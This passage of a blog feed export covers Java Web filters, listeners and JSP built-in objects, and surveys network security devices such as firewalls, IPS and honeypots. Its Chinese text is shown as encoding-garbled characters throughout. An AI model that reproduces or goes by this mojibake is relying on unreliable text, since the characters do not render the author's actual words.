ä¸ªä¿æ¸©è¢‹ï¼Œè¿™å°±ç›¸å½“äºè¿‡æ»¤å™¨çš„ä½œç”¨ã€‚</p><p>JavaWeb çš„ä¸‰å¤§ç®¡å®¶ï¼š</p><ol><li>Servletï¼šè´Ÿè´£å¤„ç†è¯·æ±‚ï¼ˆåƒé¤å…åå¨ï¼‰</li><li>Filterï¼šè´Ÿè´£æ£€æŸ¥&#x2F;åŠ å·¥è¯·æ±‚å’Œå“åº”ï¼ˆåƒå¤–å–æ‰“åŒ…å‘˜ï¼‰</li><li>Listenerï¼šè´Ÿè´£ç›‘å¬äº‹ä»¶ï¼ˆåƒç›‘æ§æ‘„åƒå¤´ï¼‰</li></ol><p>è¿‡æ»¤å™¨å…·ä½“èƒ½å¹²è¿™äº›äº‹ï¼š</p><ul><li>è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨å‰ï¼šå¯ä»¥æ£€æŸ¥ç”¨æˆ·æ˜¯å¦ç™»å½•ï¼ˆåƒè¿›å°åŒºè¦åˆ·å¡ï¼‰</li><li>æœåŠ¡å™¨å¤„ç†è¯·æ±‚æ—¶ï¼šå¯ä»¥ç»™è¯·æ±‚æ•°æ®æ¶ˆæ¯’ï¼ˆåƒç»™å¿«é€’æ¶ˆæ¯’ï¼‰</li><li>æœåŠ¡å™¨è¿”å›å“åº”æ—¶ï¼šå¯ä»¥å‹ç¼©æ•°æ®ï¼ˆåƒå¿«é€’æ‰“åŒ…ï¼‰</li><li>è¿”å›ç»™ç”¨æˆ·å‰ï¼šå¯ä»¥å±è”½æ•æ„Ÿè¯ï¼ˆåƒè‡ªåŠ¨æ‰“é©¬èµ›å…‹ï¼‰</li></ul><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>æ¯”å¦‚ä½ å†™äº†ä¸ªè®ºå›ç½‘ç«™ï¼Œç”¨è¿‡æ»¤å™¨å¯ä»¥ï¼š</p><ol><li>è‡ªåŠ¨æŠŠç”¨æˆ·å‘çš„è„è¯æ›¿æ¢æˆ***</li><li>æ£€æŸ¥ç”¨æˆ·æ˜¯å¦ç™»å½•æ‰èƒ½å‘å¸–</li><li>è®°å½•æ¯ä¸ªè®¿é—®çš„IPåœ°å€</li><li>ç»™ç½‘é¡µå†…å®¹è‡ªåŠ¨åŠ ä¸Šé˜²æ‹·è´æ°´å°</li></ol><p>ä»£ç ç¤ºä¾‹ç†è§£ï¼š<br>å°±åƒä½ é›‡äº†ä¸ªä¿å®‰ï¼ˆFilterï¼‰ï¼Œæ¯ä¸ªè®¿å®¢ï¼ˆè¯·æ±‚ï¼‰è¿›å…¬å¸ï¼ˆæœåŠ¡å™¨ï¼‰ä¹‹å‰ï¼Œä¿å®‰ä¼šæ£€æŸ¥å·¥ç‰Œï¼ˆç™»å½•çŠ¶æ€ï¼‰ã€‚å¦‚æœæ£€æŸ¥é€šè¿‡ï¼Œå°±æ”¾è¡Œï¼ˆchain.doFilterï¼‰ï¼›å¦‚æœæ²¡å·¥ç‰Œï¼Œå°±æ‹¦åœ¨é—¨å¤–ï¼ˆè·³è½¬åˆ°ç™»å½•é¡µï¼‰ã€‚</p><p>æ•´ä¸ªè¿‡ç¨‹å°±åƒæµæ°´çº¿åŠ å·¥ï¼š<br>æµè§ˆå™¨ â†’ è¿‡æ»¤å™¨1ï¼ˆæ¯”å¦‚æ£€æŸ¥ç™»å½•ï¼‰â†’ è¿‡æ»¤å™¨2ï¼ˆæ¯”å¦‚è®°å½•æ—¥å¿—ï¼‰â†’ æœåŠ¡å™¨å¤„ç† â†’ è¿‡æ»¤å™¨3ï¼ˆæ¯”å¦‚å‹ç¼©æ•°æ®ï¼‰â†’ è¿”å›ç»™æµè§ˆå™¨</p><p>æœ€å¤§çš„å¥½å¤„æ˜¯ï¼šä¸ç”¨æ”¹ç½‘ç«™åŸæœ‰ä»£ç ï¼Œå°±èƒ½æ‰¹é‡å¢åŠ å„ç§å®‰å…¨æ£€æŸ¥å’Œé™„åŠ åŠŸèƒ½ï¼Œå°±åƒç»™æ‰‹æœºè£…å„ç§æ»¤é•œAPPä¸€æ ·æ–¹ä¾¿ã€‚</p><h1 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><hr><h3 id="Listener-å¤§ç™½è¯è§£é‡Š"><a href="#Listener-å¤§ç™½è¯è§£é‡Š" class="headerlink" title="Listener å¤§ç™½è¯è§£é‡Š"></a><strong>Listener å¤§ç™½è¯è§£é‡Š</strong></h3><p><strong>Listener å°±åƒå¿«é€’ç«™çš„ã€Œè‡ªåŠ¨ç›‘æ§ç³»ç»Ÿã€</strong>ï¼Œå®ƒä¸ç›´æ¥å¤„ç†å¿«é€’ï¼ˆè¯·æ±‚&#x2F;å“åº”ï¼‰ï¼Œä½†èƒ½è‡ªåŠ¨æ„ŸçŸ¥å¿«é€’ç«™é‡Œå‘ç”Ÿçš„å„ç§äº‹ä»¶ï¼Œæ¯”å¦‚ï¼š</p><ul><li>ğŸ“¦ <strong>æœ‰äººæ¥å–ä»¶</strong>ï¼ˆç”¨æˆ·åˆ›å»ºäº†ä¼šè¯ï¼‰</li><li>ğŸ“¦ <strong>å¿«é€’è¢«é€€å›</strong>ï¼ˆç”¨æˆ·å…³é—­äº†æµè§ˆå™¨ï¼‰</li><li>ğŸ“¦ <strong>å¿«é€’ç«™å¼€é—¨&#x2F;å…³é—¨</strong>ï¼ˆæœåŠ¡å™¨å¯åŠ¨&#x2F;å…³é—­ï¼‰</li><li>ğŸ“¦ <strong>è´§æ¶ä¸Šçš„åŒ…è£¹è¢«ç§»åŠ¨</strong>ï¼ˆæ•°æ®è¢«ä¿®æ”¹ï¼‰</li></ul><p><strong>åªè¦è¿™äº›äº‹ä»¶å‘ç”Ÿï¼Œç›‘å¬å™¨å°±ä¼šè‡ªåŠ¨è§¦å‘å¯¹åº”çš„æ“ä½œ</strong>ï¼Œæ¯”å¦‚å‘çŸ­ä¿¡é€šçŸ¥ä½ ã€æ›´æ–°åº“å­˜ã€è®°å½•æ—¥å¿—ç­‰ç­‰ã€‚</p><hr><h3 id="ä¸¾ä¸ªå®é™…ä¾‹å­"><a href="#ä¸¾ä¸ªå®é™…ä¾‹å­" class="headerlink" title="ä¸¾ä¸ªå®é™…ä¾‹å­"></a><strong>ä¸¾ä¸ªå®é™…ä¾‹å­</strong></h3><p><strong>åœºæ™¯</strong>ï¼šä½ æƒ³ç»Ÿè®¡ç½‘ç«™çš„åœ¨çº¿äººæ•°<br><strong>ç”¨ Listener æ€ä¹ˆåš</strong>ï¼š</p><ol><li><strong>å½“ç”¨æˆ·ç™»å½•æ—¶</strong>ï¼ˆåˆ›å»ºäº†ä¸€ä¸ª Sessionï¼‰ï¼Œè‡ªåŠ¨ç»™åœ¨çº¿äººæ•° +1</li><li><strong>å½“ç”¨æˆ·é€€å‡ºæˆ– Session è¿‡æœŸæ—¶</strong>ï¼Œè‡ªåŠ¨ç»™åœ¨çº¿äººæ•° -1</li><li><strong>å½“æœåŠ¡å™¨é‡å¯æ—¶</strong>ï¼Œè‡ªåŠ¨æ¸…é›¶åœ¨çº¿äººæ•°</li></ol><p><strong>å…¨ç¨‹ä¸éœ€è¦ä½ æ‰‹åŠ¨å†™ä»£ç å»ç»Ÿè®¡</strong>ï¼Œç›‘å¬å™¨åƒä¸ªå°é›·è¾¾ä¸€æ ·è‡ªåŠ¨å¸®ä½ ç›¯ç€è¿™äº›äº‹ä»¶ï¼</p><hr><h3 id="Listener-èƒ½ç›‘å¬å“ªäº›äº‹ï¼Ÿ"><a href="#Listener-èƒ½ç›‘å¬å“ªäº›äº‹ï¼Ÿ" class="headerlink" title="Listener èƒ½ç›‘å¬å“ªäº›äº‹ï¼Ÿ"></a><strong>Listener èƒ½ç›‘å¬å“ªäº›äº‹ï¼Ÿ</strong></h3><p>1. </p><p>   æœåŠ¡å™¨çº§åˆ«</p><p>   ï¼š</p><ul><li>æœåŠ¡å™¨å¯åŠ¨ï¼ˆæ¯”å¦‚åŠ è½½æ•°æ®åº“é…ç½®ï¼‰</li><li>æœåŠ¡å™¨å…³é—­ï¼ˆæ¯”å¦‚ä¿å­˜æœªå¤„ç†å®Œçš„æ•°æ®ï¼‰</li></ul><p>2. </p><p>   ç”¨æˆ·ä¼šè¯ï¼ˆSessionï¼‰çº§åˆ«</p><p>   ï¼š</p><ul><li>ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼ˆåˆ›å»º Sessionï¼‰</li><li>ç”¨æˆ·å…³é—­æµè§ˆå™¨ï¼ˆé”€æ¯ Sessionï¼‰</li></ul><p>3. </p><p>   æ•°æ®å˜åŒ–</p><p>   ï¼š</p><ul><li>æŸä¸ªæ•°æ®è¢«æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤ï¼ˆæ¯”å¦‚è´­ç‰©è½¦å•†å“å˜åŒ–ï¼‰</li></ul><hr><h3 id="Listener-vs-Filter-åŒºåˆ«"><a href="#Listener-vs-Filter-åŒºåˆ«" class="headerlink" title="Listener vs Filter åŒºåˆ«"></a><strong>Listener vs Filter åŒºåˆ«</strong></h3><ul><li>ğŸ”§ <strong>Filterï¼ˆè¿‡æ»¤å™¨ï¼‰</strong>ï¼šåƒä¿å®‰ï¼Œ<strong>ä¸»åŠ¨æ£€æŸ¥</strong>æ¯ä¸ªè¿›å‡ºçš„äººï¼ˆè¯·æ±‚&#x2F;å“åº”ï¼‰ï¼Œä¸é€šè¿‡å°±æ‹¦ä¸‹ã€‚</li><li>ğŸ“¡ <strong>Listenerï¼ˆç›‘å¬å™¨ï¼‰</strong>ï¼šåƒç›‘æ§æ‘„åƒå¤´ï¼Œ<strong>è¢«åŠ¨æ„ŸçŸ¥</strong>äº‹ä»¶å‘ç”Ÿï¼Œé»˜é»˜æ‰§è¡Œåå°ä»»åŠ¡ã€‚</li></ul><hr><h3 id="ä¸€å¥è¯æ€»ç»“-1"><a href="#ä¸€å¥è¯æ€»ç»“-1" class="headerlink" title="ä¸€å¥è¯æ€»ç»“"></a><strong>ä¸€å¥è¯æ€»ç»“</strong></h3><p><strong>Listener å°±æ˜¯ç»™æœåŠ¡å™¨è£…äº†ä¸ªã€Œæ™ºèƒ½æ„Ÿåº”å™¨ã€</strong>ï¼Œå®ƒèƒ½è‡ªåŠ¨æ„ŸçŸ¥å„ç§äº‹ä»¶ï¼Œå¹¶åœ¨èƒŒåå¸®ä½ å¹²æ´»ï¼Œå°±åƒä½ å®¶çš„æ™ºèƒ½å®¶å±…è‡ªåŠ¨å¼€ç¯å…³ç¯ä¸€æ ·çœå¿ƒï¼</p><h1 id="JSP-åŸºç¡€"><a href="#JSP-åŸºç¡€" class="headerlink" title="JSP åŸºç¡€"></a>JSP åŸºç¡€</h1><p>JSPï¼ˆJava Server Pagesï¼‰ï¼Œæ˜¯Javaçš„ä¸€ç§åŠ¨æ€ç½‘é¡µæŠ€æœ¯ã€‚åœ¨æ—©æœŸJavaçš„å¼€å‘æŠ€æœ¯ä¸­ï¼ŒJavaç¨‹åºå‘˜å¦‚æœæƒ³è¦å‘æµè§ˆå™¨è¾“å‡ºä¸€äº›æ•°æ®ï¼Œå°±å¿…é¡»å¾—æ‰‹åŠ¨<code>println</code>ä¸€è¡Œè¡Œçš„HTMLä»£ç ã€‚ä¸ºäº†è§£å†³è¿™ä¸€ç¹ççš„é—®é¢˜ï¼ŒJavaå¼€å‘äº†JSPæŠ€æœ¯ã€‚</p><p>JSPå¯ä»¥çœ‹ä½œä¸€ä¸ªJava Servletï¼Œä¸»è¦ç”¨äºå®ç°Java webåº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢éƒ¨åˆ†ã€‚ç½‘é¡µå¼€å‘è€…ä»¬é€šè¿‡ç»“åˆHTMLä»£ç ã€XHTMLä»£ç ã€XMLå…ƒç´ ä»¥åŠåµŒå…¥JSPæ“ä½œå’Œå‘½ä»¤æ¥ç¼–å†™JSPã€‚</p><p>å½“ç¬¬ä¸€æ¬¡è®¿é—®JSPé¡µé¢æ—¶ï¼ŒTomcatæœåŠ¡å™¨ä¼šå°†JSPé¡µé¢ç¿»è¯‘æˆä¸€ä¸ªjavaæ–‡ä»¶ï¼Œå¹¶å°†å…¶ç¼–è¯‘ä¸º.classæ–‡ä»¶ã€‚JSPé€šè¿‡ç½‘é¡µè¡¨å•è·å–ç”¨æˆ·è¾“å…¥æ•°æ®ã€è®¿é—®æ•°æ®åº“åŠå…¶ä»–æ•°æ®æºï¼Œç„¶ååŠ¨æ€åœ°åˆ›å»ºç½‘é¡µã€‚</p><h3 id="JSPå†…ç½®å¯¹è±¡"><a href="#JSPå†…ç½®å¯¹è±¡" class="headerlink" title="JSPå†…ç½®å¯¹è±¡"></a>JSPå†…ç½®å¯¹è±¡</h3><p>JSPæœ‰ä¹å¤§å†…ç½®å¯¹è±¡ï¼Œä»–ä»¬èƒ½å¤Ÿåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯äº¤äº’çš„è¿‡ç¨‹ä¸­åˆ†åˆ«å®Œæˆä¸åŒçš„åŠŸèƒ½ã€‚å…¶ç‰¹ç‚¹å¦‚ä¸‹</p><ul><li><p>ç”± JSP è§„èŒƒæä¾›ï¼Œä¸ç”¨ç¼–å†™è€…å®ä¾‹åŒ–</p></li><li><p>é€šè¿‡ Web å®¹å™¨å®ç°å’Œç®¡ç†</p></li><li><p>æ‰€æœ‰ JSP é¡µé¢å‡å¯ä½¿ç”¨</p></li><li><p>åªæœ‰åœ¨è„šæœ¬å…ƒç´ çš„è¡¨è¾¾å¼æˆ–ä»£ç æ®µä¸­æ‰èƒ½ä½¿ç”¨</p></li><li></li><li><table><thead><tr><th>å¯¹ è±¡</th><th>ç±»å‹</th><th>è¯´ æ˜</th></tr></thead><tbody><tr><td><a href="https://drun1baby.top/jsp2/request.html">request</a></td><td>javax.servlet.http.HttpServletRequest</td><td>è·å–ç”¨æˆ·è¯·æ±‚ä¿¡æ¯</td></tr><tr><td><a href="https://drun1baby.top/jsp2/response.html">response</a></td><td>javax.servlet.http.HttpServletResponse</td><td>å“åº”å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¹¶å°†å¤„ç†ä¿¡æ¯è¿”å›åˆ°å®¢æˆ·ç«¯</td></tr><tr><td><a href="https://drun1baby.top/jsp2/out.html">out</a></td><td>javax.servlet.jsp.JspWriter</td><td>è¾“å‡ºå†…å®¹åˆ° HTML ä¸­</td></tr><tr><td><a href="https://drun1baby.top/jsp2/session.html">session</a></td><td>javax.servlet.http.HttpSession</td><td>ç”¨æ¥ä¿å­˜ç”¨æˆ·ä¿¡æ¯</td></tr><tr><td><a href="https://drun1baby.top/jsp2/application.html">application</a></td><td>javax.servlet.ServletContext</td><td>æ‰€æœ‰ç”¨æˆ·å…±äº«ä¿¡æ¯</td></tr><tr><td><a href="https://drun1baby.top/jsp2/config.html">config</a></td><td>javax.servlet.ServletConfig</td><td>è¿™æ˜¯ä¸€ä¸ª Servlet é…ç½®å¯¹è±¡ï¼Œç”¨äº Servlet å’Œé¡µé¢çš„åˆå§‹åŒ–å‚æ•°</td></tr><tr><td><a href="https://drun1baby.top/jsp2/pagecontext.html">pageContext</a></td><td>javax.servlet.jsp.PageContext</td><td>JSP çš„é¡µé¢å®¹å™¨ï¼Œç”¨äºè®¿é—® pageã€requestã€application å’Œ session çš„å±æ€§</td></tr><tr><td><a href="https://drun1baby.top/jsp2/page_object.html">page</a></td><td>javax.servlet.jsp.HttpJspPage</td><td>ç±»ä¼¼äº Java ç±»çš„ this å…³é”®å­—ï¼Œè¡¨ç¤ºå½“å‰ JSP é¡µé¢</td></tr><tr><td><a href="https://drun1baby.top/jsp2/page.html">exception</a></td><td>java.lang.Throwable</td><td>è¯¥å¯¹è±¡ç”¨äºå¤„ç† JSP æ–‡ä»¶æ‰§è¡Œæ—¶å‘ç”Ÿçš„é”™è¯¯å’Œå¼‚å¸¸ï¼›åªæœ‰åœ¨ JSP é¡µé¢çš„ page æŒ‡ä»¤ä¸­æŒ‡å®š isErrorPage çš„å–å€¼ true æ—¶ï¼Œæ‰å¯ä»¥åœ¨æœ¬é¡µé¢ä½¿ç”¨ exception å¯¹è±¡ã€‚</td></tr></tbody></table></li></ul><p>from:<a href="https://drun1baby.top/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Java-Web-ä¸‰å¤§ä»¶&quot;&gt;&lt;a href=&quot;#Java-Web-ä¸‰å¤§ä»¶&quot; class=&quot;headerlink&quot; title=&quot;Java Web ä¸‰å¤§ä»¶&quot;&gt;&lt;/a&gt;Java Web ä¸‰å¤§ä»¶&lt;/h2&gt;&lt;p&gt;Java Web ä¸‰å¤§ä»¶ï¼Œä¹Ÿå°±æ˜¯ Servletï¼ŒFilte</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸è§å®‰å…¨è®¾å¤‡æ€»ç»“</title>
    <link href="https://gu0f3n.github.io/2025/03/27/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%80%BB%E7%BB%93%E2%80%9C/"/>
    <id>https://gu0f3n.github.io/2025/03/27/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%80%BB%E7%BB%93%E2%80%9C/</id>
    <published>2025-03-27T09:33:03.000Z</published>
    <updated>2025-03-27T11:25:01.390Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡"><a href="#ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡" class="headerlink" title="ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡"></a>ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡</h2><p>ç½‘ç»œå®‰å…¨è®¾å¤‡æ˜¯ä¸€ä¸ªæœ‰è½¯ä»¶å’Œç¡¬ä»¶è®¾å¤‡ç»„åˆè€Œæˆã€åœ¨å†…éƒ¨ç½‘å’Œå¤–éƒ¨ç½‘ä¹‹é—´ã€ä¸“ç”¨ç½‘ä¸å…¬å…±ç½‘ ä¹‹é—´çš„ç•Œé¢ä¸Šæ„é€ çš„ä¿æŠ¤å±éšœï¼Œé’ˆå¯¹ä¸åŒçš„åº”ç”¨åœºæ™¯æœ‰ä¸åŒçš„ä½œç”¨ï¼Œå¸¸è§çš„å®‰å…¨è®¾å¤‡æœ‰é˜²ç«å¢™ï¼Œæ€åŠ¿æ„ŸçŸ¥ï¼ŒIDSï¼ŒIPSï¼Œå…¨æµé‡åˆ†æï¼Œæ¼æ´æ‰«æï¼Œèœœç½ ï¼Œå®‰å…¨é‚®ä»¶ï¼ŒEDRç­‰ç­‰ã€‚</p><h2 id="ç½‘ç»œç»“æ„"><a href="#ç½‘ç»œç»“æ„" class="headerlink" title="ç½‘ç»œç»“æ„"></a>ç½‘ç»œç»“æ„</h2><p>é¦–å…ˆï¼Œç»˜åˆ¶äº†æœ€ç®€æ˜“ä¸‰å±‚<a href="https://so.csdn.net/so/search?q=%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84&spm=1001.2101.3001.7020">ç½‘ç»œæ‹“æ‰‘ç»“æ„</a>(å«å†…å¤–ç½‘)ã€‚ç°æ— ä»»ä½•å®‰å…¨è®¾å¤‡ï¼Œä»‹ç»æ¯ä¸€ç±»è®¾å¤‡ï¼Œå¸¸ç”¨åŠŸèƒ½ã€<strong>éƒ¨ç½²æ–¹å¼</strong>ï¼ŒåŒæ—¶ç»˜å…¥ç°æœ‰æ‹“æ‰‘ä¸­ï¼Œå±•ç¤ºç§äº§å“åœ¨ç½‘ç»œä¸­æœ€å¸¸è§„ä½ç½®ã€‚</p><p><strong>éƒ¨ç½²æ–¹å¼å°¤å…¶é‡è¦ï¼Œé€šå¸¸éœ€å¯¹ç½‘ç»œè¿›è¡Œæ§åˆ¶è®¾å¤‡ä¸²è¡Œã€å®¡è®¡ç±»è®¾å¤‡æ—æŒ‚ï¼Œä¸²è¡Œæ—¶è®¾å¤‡æ•…éšœå¯èƒ½äº§ç”Ÿç½‘ç»œæ•…éšœï¼›è€Œæ—æŒ‚è®¾å¤‡åªå½±å“è‡ªèº«åŠŸèƒ½</strong></p><p><a href="https://blog.csdn.net/weixin_46444606/article/details/114528599">https://blog.csdn.net/weixin_46444606/article/details/114528599</a></p><h2 id="1-é˜²ç«å¢™"><a href="#1-é˜²ç«å¢™" class="headerlink" title="1.é˜²ç«å¢™"></a>1.é˜²ç«å¢™</h2><p>ä¸²è¡Œè®¾å¤‡<br>ç½‘ç»œè¾¹ç•Œé—´çš„éš”ç¦»å’Œå¯¹ç½‘ç»œä¸­æ•°æ®äº¤äº’çš„æ§åˆ¶ã€‚åœ¨å…¸å‹çš„ç½‘ç»œç¯å¢ƒä¸­çš„ä¸»è¦ä½œç”¨æ˜¯é˜²èŒƒå¤–éƒ¨ç½‘ç»œï¼ˆå¦‚internetï¼‰å¯¹å†…éƒ¨ç½‘ç»œï¼ˆå¦‚å†…éƒ¨åŠå…¬å±€åŸŸç½‘ï¼‰çš„éæ³•è®¿é—®è¡Œä¸ºå’Œæ¶æ„æ”»å‡»è¡Œä¸ºç­‰å®‰å…¨å¨èƒï¼Œé˜²ç«å¢™æœ€åŸºç¡€çš„åŠŸèƒ½æ˜¯ç­–ç•¥æ§åˆ¶æµå…¥æµå‡ºIPåŠç«¯å£ã€natã€ç«¯å£æ˜ å°„ã€‚é˜²ç«å¢™å®šä¹‰ä¹Ÿè¾ƒä¸ºæ¨¡ç³Šï¼Œå¤šå¸¦æœ‰é›†æˆåŠŸèƒ½ï¼Œç›®å‰ï¼Œä¸–é¢ä¸Šè´­ä¹°çš„é˜²ç«å¢™å¤§å¤šä¹Ÿå¸¦æœ‰IPSåŠŸèƒ½æˆ–æœåŠ¡ï¼ˆå…¼é¡¾åŠŸèƒ½ï¼‰<br>é˜²ç«å¢™çš„â€œä¸²è¡Œè®¾å¤‡â€ç‰¹æ€§è®©å®ƒæˆä¸ºç½‘ç»œè¾¹ç•Œçš„<strong>å”¯ä¸€å…³å¡</strong>ï¼Œé€šè¿‡ç­–ç•¥ã€NATã€ç«¯å£æ˜ å°„ä¸‰å¤§åŸºç¡€åŠŸèƒ½ï¼ŒåŠ ä¸Šç°ä»£é›†æˆçš„IPSç­‰é«˜çº§èƒ½åŠ›ï¼Œå®ç°äº†â€œå¤–é˜²å…¥ä¾µã€å†…æ§é£é™©â€çš„æ•ˆæœã€‚ä¸è¿‡ï¼Œå®ƒä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„â€”â€”å°±åƒé—¨å«å¯èƒ½æ¼æ‰ä¼ªè£…æˆå¿«é€’çš„é»‘å®¢ï¼Œé˜²ç«å¢™ä¹Ÿéœ€è¦é…åˆå…¶ä»–è®¾å¤‡ï¼ˆå¦‚IDSã€æ—¥å¿—å®¡è®¡ï¼‰æ‰èƒ½æ›´å®‰å…¨</p><h2 id="2-IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰"><a href="#2-IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰" class="headerlink" title="2.IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰"></a>2.IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰</h2><p><strong>ä¸²è¡Œè®¾å¤‡</strong><br>é˜²å¾¡ç½‘ç»œä¸­çš„æ”»å‡»å’Œå…¥ä¾µç­‰è¡Œä¸ºçš„ç½‘å…³å‹å®‰å…¨è®¾å¤‡ï¼Œ<strong>åœ¨å®‰å…¨åŠŸèƒ½ä¸Šæ˜¯å¯¹é˜²ç«å¢™çš„ä¸€ä¸ªè¡¥å……ï¼Œ</strong> å®ƒèƒ½å¤Ÿæ¯”é˜²ç«å¢™æ›´æ·±å…¥çš„å¯¹æ•°æ®è¿›è¡Œæ£€æµ‹å’Œæ§åˆ¶ï¼Œè¿›è€Œæå‡ç½‘ç»œå¯¹äºå…¥ä¾µæ”»å‡»ç­‰å¨èƒçš„é˜²èŒƒæ°´å¹³ã€‚<strong>æœ¬è´¨æ˜¯å¢å¼ºå…¥ä¾µè¡Œä¸ºåº“ï¼Œæ£€æµ‹å‡ºåè‡ªåŠ¨è¿›è¡Œé˜²å¾¡</strong></p><p><strong>å¦‚ä½•è¡¥å……é˜²ç«å¢™</strong></p><p>é˜²ç«å¢™åƒå°åŒºçš„é—¨å«ï¼Œåªæ£€æŸ¥â€œå¿«é€’å•â€ï¼ˆIP åœ°å€ã€ç«¯å£å·ï¼‰ï¼Œæ¯”å¦‚ï¼š</p><p><strong>é—¨å«çš„å±€é™</strong>ï¼šèƒ½æ‹¦ä½æ²¡å·¥ç‰Œçš„å¤–äººï¼Œä½†å¦‚æœåäººä¼ªé€ äº†å·¥ç‰Œï¼ˆæ¯”å¦‚é€šè¿‡åˆæ³•ç«¯å£å‘é€æ”»å‡»æ•°æ®ï¼‰ï¼Œé—¨å«å°±æ”¾è¡Œäº†</p><p><strong>IPS çš„å‡çº§</strong>ï¼šIPS ä¼šæ‹†å¼€å¿«é€’åŒ…è£¹æ£€æŸ¥å†…å®¹ï¼Œæ¯”å¦‚</p><p>å‘ç°åŒ…è£¹é‡Œè—äº†åˆ€ç‰‡ï¼ˆSQL æ³¨å…¥ä»£ç ï¼‰æˆ–ç‚¸å¼¹ï¼ˆç—…æ¯’æ–‡ä»¶ï¼‰ï¼Œç›´æ¥æ‹¦æˆª</p><p>ç”šè‡³èƒ½è¯†åˆ«æ–°å‹æ”»å‡»æ‰‹æ®µï¼Œæ¯”å¦‚ä¼ªè£…æˆæ­£å¸¸æ–‡ä»¶çš„å‹’ç´¢è½¯ä»¶</p><h2 id="æ€åŠ¿æ„ŸçŸ¥"><a href="#æ€åŠ¿æ„ŸçŸ¥" class="headerlink" title="æ€åŠ¿æ„ŸçŸ¥"></a>æ€åŠ¿æ„ŸçŸ¥</h2><p>æ€åŠ¿æ„ŸçŸ¥æ˜¯ä¸€ç§åŸºäºç¯å¢ƒçš„ã€åŠ¨æ€ã€æ•´ä½“åœ°æ´æ‚‰å®‰å…¨é£é™©çš„èƒ½åŠ›ï¼Œæ˜¯ä»¥å®‰å…¨å¤§æ•°æ®ä¸ºåŸºç¡€ï¼Œä»å…¨å±€è§†è§’æå‡å¯¹å®‰å…¨å¨èƒçš„å‘ç°è¯†åˆ«ã€ç†è§£åˆ†æã€å“åº”å¤„ç½®èƒ½åŠ›çš„ä¸€ç§æ–¹å¼ï¼Œæœ€ç»ˆæ˜¯ä¸ºäº†å†³ç­–ä¸è¡ŒåŠ¨ï¼Œ æ˜¯å®‰å…¨èƒ½åŠ›çš„è½åœ°</p><p><strong>æ€åŠ¿æ„ŸçŸ¥</strong>å°±åƒç»™ç½‘ç»œè£…äº†ä¸€ä¸ªâ€œæ™ºèƒ½é›·è¾¾+é¢„è¨€å®¶â€çš„ç»„åˆï¼Œå®ƒèƒ½ <strong>å®æ—¶ç›‘æ§æ•´ä¸ªç½‘ç»œç¯å¢ƒ</strong>ï¼ŒæŠŠå„ç§é›¶æ•£çš„ä¿¡æ¯æ‹¼æˆä¸€å¼ â€œå®‰å…¨åœ°å›¾â€ï¼Œç„¶åå‘Šè¯‰ä½ ï¼šâ€œç°åœ¨å“ªå„¿æœ‰é—®é¢˜ï¼Ÿæ¥ä¸‹æ¥å¯èƒ½è¦å‡ºä»€ä¹ˆäº‹ï¼Ÿå’±ä»¬è¯¥æ€ä¹ˆé˜²ï¼Ÿâ€<br>ç®€å•è¯´å°±æ˜¯ï¼š<strong>çœ‹æ¸…ç°çŠ¶ã€é¢„æµ‹é£é™©ã€æå‰åŠ¨æ‰‹</strong>ï¼Œè®©ç½‘ç»œä»â€œè¢«åŠ¨æŒ¨æ‰“â€å˜æˆâ€œä¸»åŠ¨é˜²</p><p><strong>æ€åŠ¿æ„ŸçŸ¥ &#x3D; å®æ—¶ç›‘æ§ + æ™ºèƒ½åˆ†æ + é£é™©é¢„è¨€</strong>ã€‚å®ƒè®©ç½‘ç»œå®‰å…¨ä»â€œå¤´ç—›åŒ»å¤´â€å˜æˆâ€œæ²»æœªç—…â€ï¼Œæ ¸å¿ƒå°±ä¸€å¥è¯ï¼š<strong>â€œåˆ«ç­‰é»‘å®¢åŠ¨æ‰‹ï¼Œå’±å…ˆå µæ­»ä»–çš„è·¯ï¼</strong></p><h2 id="èœœç½"><a href="#èœœç½" class="headerlink" title="èœœç½"></a>èœœç½</h2><p>èœœç½è¿™ä¸ªè¯ï¼Œæœ€æ—©æ˜¯è¢«çŒäººä½¿ç”¨çš„ï¼Œå¯¹ï¼Œå°±æ˜¯è¿›å±±æ‰“çŒçš„äººã€‚çŒäººæŠŠç½å­è£…ä¸Š èœ‚èœœï¼Œç„¶åæ”¾ä¸ªé™·é˜±ï¼Œä¸“é—¨ç”¨æ¥æ•æ‰å–œæ¬¢ç”œé£Ÿçš„ç†Šã€‚åæ¥åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸé‡Œï¼Œ 